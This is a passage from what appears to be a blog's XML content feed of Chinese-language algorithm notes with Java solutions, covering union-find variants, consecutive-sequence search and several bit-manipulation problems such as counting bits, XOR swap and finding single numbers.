punctuation">[</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">++</span>len<span class="token punctuation">;</span>        <span class="token operator">++</span>p<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      max <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">++</span>p<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> max<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">lengthOfLongestConsecutiveSequenceSet</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    Set<span class="token operator">&lt;</span>Integer<span class="token operator">></span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token operator">:</span> nums<span class="token punctuation">)</span> set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>set<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      set<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> low <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> high <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>set<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token operator">--</span>low<span class="token punctuation">)</span><span class="token punctuation">)</span> set<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>low<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>set<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token operator">++</span>high<span class="token punctuation">)</span><span class="token punctuation">)</span> set<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>high<span class="token punctuation">)</span><span class="token punctuation">;</span>      max <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> high <span class="token operator">-</span> low <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> max<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>并查集</title>
      <link href="/2019/01/05/suan-fa/bing-cha-ji/"/>
      <url>/2019/01/05/suan-fa/bing-cha-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h2><p>用于解决动态连通性问题，能动态连接两个点，并且判断两个点是否连通。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/9d0a637c-6a8f-4f5a-99b9-fdcfa26793ff.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/9d0a637c-6a8f-4f5a-99b9-fdcfa26793ff.png" alt="img"></a></p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>UF(int N)</td><td>构造一个大小为 N 的并查集</td></tr><tr><td>void union(int p, int q)</td><td>连接 p 和 q 节点</td></tr><tr><td>int find(int p)</td><td>查找 p 所在的连通分量编号</td></tr><tr><td>boolean connected(int p, int q)</td><td>判断 p 和 q 节点是否连通</td></tr></tbody></table><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">UF</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> id<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">UF</span><span class="token punctuation">(</span><span class="token keyword">int</span> N<span class="token punctuation">)</span> <span class="token punctuation">{</span>        id <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            id<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">connected</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> q<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">find</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">find</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">int</span> <span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">union</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> q<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Quick-Find"><a href="#Quick-Find" class="headerlink" title="Quick Find"></a>Quick Find</h2><p>可以快速进行 find 操作，也就是可以快速判断两个节点是否连通。</p><p>需要保证同一连通分量的所有节点的 id 值相等。</p><p>但是 union 操作代价却很高，需要将其中一个连通分量中的所有节点 id 值都修改为另一个节点的 id 值。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/8f0cc500-5994-4c7a-91a9-62885d658662.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/8f0cc500-5994-4c7a-91a9-62885d658662.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">QuickFindUF</span> <span class="token keyword">extends</span> <span class="token class-name">UF</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">QuickFindUF</span><span class="token punctuation">(</span><span class="token keyword">int</span> N<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> id<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">union</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> q<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> pID <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> qID <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pID <span class="token operator">==</span> qID<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> id<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>id<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> pID<span class="token punctuation">)</span> <span class="token punctuation">{</span>                id<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> qID<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="Quick-Union"><a href="#Quick-Union" class="headerlink" title="Quick Union"></a>Quick Union</h2><p>可以快速进行 union 操作，只需要修改一个节点的 id 值即可。</p><p>但是 find 操作开销很大，因为同一个连通分量的节点 id 值不同，id 值只是用来指向另一个节点。因此需要一直向上查找操作，直到找到最上层的节点。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/5d4a5181-65fb-4bf2-a9c6-899cab534b44.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/5d4a5181-65fb-4bf2-a9c6-899cab534b44.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">QuickUnionUF</span> <span class="token keyword">extends</span> <span class="token class-name">UF</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">QuickUnionUF</span><span class="token punctuation">(</span><span class="token keyword">int</span> N<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> id<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            p <span class="token operator">=</span> id<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> p<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">union</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> q<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> pRoot <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> qRoot <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pRoot <span class="token operator">!=</span> qRoot<span class="token punctuation">)</span> <span class="token punctuation">{</span>            id<span class="token punctuation">[</span>pRoot<span class="token punctuation">]</span> <span class="token operator">=</span> qRoot<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这种方法可以快速进行 union 操作，但是 find 操作和树高成正比，最坏的情况下树的高度为节点的数目。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/bfbb11e2-d208-4efa-b97b-24cd40467cd8.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/bfbb11e2-d208-4efa-b97b-24cd40467cd8.png" alt="img"></a></p><h2 id="加权-Quick-Union"><a href="#加权-Quick-Union" class="headerlink" title="加权 Quick Union"></a>加权 Quick Union</h2><p>为了解决 quick-union 的树通常会很高的问题，加权 quick-union 在 union 操作时会让较小的树连接较大的树上面。</p><p>理论研究证明，加权 quick-union 算法构造的树深度最多不超过 logN。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/a4c17d43-fa5e-4935-b74e-147e7f7e782c.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/a4c17d43-fa5e-4935-b74e-147e7f7e782c.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WeightedQuickUnionUF</span> <span class="token keyword">extends</span> <span class="token class-name">UF</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 保存节点的数量信息</span>    <span class="token keyword">private</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> sz<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">WeightedQuickUnionUF</span><span class="token punctuation">(</span><span class="token keyword">int</span> N<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>sz <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>sz<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> id<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            p <span class="token operator">=</span> id<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> p<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">union</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> q<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> j<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>sz<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> sz<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            id<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>            sz<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+=</span> sz<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            id<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>            sz<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> sz<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="路径压缩的加权-Quick-Union"><a href="#路径压缩的加权-Quick-Union" class="headerlink" title="路径压缩的加权 Quick Union"></a>路径压缩的加权 Quick Union</h2><p>在检查节点的同时将它们直接链接到根节点，只需要在 find 中添加一个循环即可。</p><h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><table><thead><tr><th>算法</th><th>union</th><th>find</th></tr></thead><tbody><tr><td>Quick Find</td><td>N</td><td>1</td></tr><tr><td>Quick Union</td><td>树高</td><td>树高</td></tr><tr><td>加权 Quick Union</td><td>logN</td><td>logN</td></tr><tr><td>路径压缩的加权 Quick Union</td><td>非常接近 1</td><td>非常接近 1</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>统计从 0 ~ n 每个数的二进制表示中1的个数</title>
      <link href="/2019/01/05/suan-fa/wei-yun-suan/tong-ji-cong-0-n-mei-ge-shu-de-er-jin-zhi-biao-shi-zhong-1-de-ge-shu/"/>
      <url>/2019/01/05/suan-fa/wei-yun-suan/tong-ji-cong-0-n-mei-ge-shu-de-er-jin-zhi-biao-shi-zhong-1-de-ge-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="统计从-0-n-每个数的二进制表示中1的个数"><a href="#统计从-0-n-每个数的二进制表示中1的个数" class="headerlink" title="统计从 0 ~ n 每个数的二进制表示中1的个数"></a>统计从 0 ~ n 每个数的二进制表示中1的个数</h2><p><strong>问题</strong></p><p>给定一个非负整数num。每一个数字我范围在0≤≤num计算1的二进制表示的数量和返回一个数组。</p><pre><code>Input: 5Output: [0,1,1,2,1,2]</code></pre><p><strong>代码</strong></p><p>对于数字 6(110)，它可以看成是 4(100) 再加一个 2(10)，因此 dp[i] = dp[i&amp;(i-1)] + 1;</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">countBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ret <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>num <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> num<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        ret<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> ret<span class="token punctuation">[</span>i<span class="token operator">&amp;</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不用额外变量交换两个整数</title>
      <link href="/2019/01/05/suan-fa/wei-yun-suan/bu-yong-e-wai-bian-liang-jiao-huan-liang-ge-zheng-shu/"/>
      <url>/2019/01/05/suan-fa/wei-yun-suan/bu-yong-e-wai-bian-liang-jiao-huan-liang-ge-zheng-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="不用额外变量交换两个整数"><a href="#不用额外变量交换两个整数" class="headerlink" title="不用额外变量交换两个整数"></a>不用额外变量交换两个整数</h2><p><strong>问题</strong></p><p>不用额外变量交换两个整数。</p><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java">a <span class="token operator">=</span> a <span class="token operator">^</span> b<span class="token punctuation">;</span>b <span class="token operator">=</span> a <span class="token operator">^</span> b<span class="token punctuation">;</span>a <span class="token operator">=</span> a <span class="token operator">^</span> b<span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数组中唯一一个不重复的元素</title>
      <link href="/2019/01/05/suan-fa/wei-yun-suan/shu-zu-zhong-wei-yi-yi-ge-bu-chong-fu-de-yuan-su/"/>
      <url>/2019/01/05/suan-fa/wei-yun-suan/shu-zu-zhong-wei-yi-yi-ge-bu-chong-fu-de-yuan-su/</url>
      
        <content type="html"><![CDATA[<h2 id="数组中唯一一个不重复的元素"><a href="#数组中唯一一个不重复的元素" class="headerlink" title="数组中唯一一个不重复的元素"></a>数组中唯一一个不重复的元素</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个数组求数组中唯一一个不重复的元素。</p><pre><code>Input: [4,1,2,1,2]Output: 4</code></pre><p><strong>代码</strong></p><p>两个相同的数异或的结果为 0，对所有数进行异或操作，最后的结果就是单独出现的那个数。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">singleNumber</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> n <span class="token operator">:</span> nums<span class="token punctuation">)</span> ret <span class="token operator">=</span> ret <span class="token operator">^</span> n<span class="token punctuation">;</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数组中不重复的两个元素</title>
      <link href="/2019/01/05/suan-fa/wei-yun-suan/shu-zu-zhong-bu-chong-fu-de-liang-ge-yuan-su/"/>
      <url>/2019/01/05/suan-fa/wei-yun-suan/shu-zu-zhong-bu-chong-fu-de-liang-ge-yuan-su/</url>
      
        <content type="html"><![CDATA[<h2 id="数组中不重复的两个元素"><a href="#数组中不重复的两个元素" class="headerlink" title="数组中不重复的两个元素"></a>数组中不重复的两个元素</h2><p><strong>问题</strong></p><p>给定一个数字数组，其中恰好有两个元素只出现一次，而所有其他元素正好出现两次。找到只出现一次的两个元素。</p><pre class=" language-java"><code class="language-java">Input<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>Output<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span></code></pre><p><strong>代码</strong></p><p>两个不相等的元素在位级表示上必定会有一位存在不同。</p><p>将数组的所有元素异或得到的结果为不存在重复的两个元素异或的结果。</p><p>diff &amp;= -diff 得到出 diff 最右侧不为 0 的位，也就是不存在重复的两个元素在位级表示上最右侧不同的那一位，利用这一位就可以将两个元素区分开来。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">singleNumber</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> diff <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> num <span class="token operator">:</span> nums<span class="token punctuation">)</span> diff <span class="token operator">^=</span> num<span class="token punctuation">;</span>    diff <span class="token operator">&amp;=</span> <span class="token operator">-</span>diff<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 得到最右一位</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ret <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> num <span class="token operator">:</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>num <span class="token operator">&amp;</span> diff<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> ret<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^=</span> num<span class="token punctuation">;</span>        <span class="token keyword">else</span> ret<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^=</span> num<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>翻转一个数的比特位</title>
      <link href="/2019/01/05/suan-fa/wei-yun-suan/fan-zhuan-yi-ge-shu-de-bi-te-wei/"/>
      <url>/2019/01/05/suan-fa/wei-yun-suan/fan-zhuan-yi-ge-shu-de-bi-te-wei/</url>
      
        <content type="html"><![CDATA[<h2 id="翻转一个数的比特位"><a href="#翻转一个数的比特位" class="headerlink" title="翻转一个数的比特位"></a>翻转一个数的比特位</h2><p><strong>问题</strong></p><p>给定32位无符号整数的反位。</p><pre class=" language-java"><code class="language-java">输入<span class="token operator">:</span><span class="token number">00000010100101000001111010011100</span>输出<span class="token operator">:</span><span class="token number">00111001011110000010100101000000</span>说明<span class="token operator">:</span>输入的二进制字符串<span class="token number">00000010100101000001111010011100</span>表示无符号整数<span class="token number">43261596</span>，因此返回<span class="token number">964176192</span>，其二进制表示为<span class="token number">00111001011110000010100101000000</span>。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">reverseBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        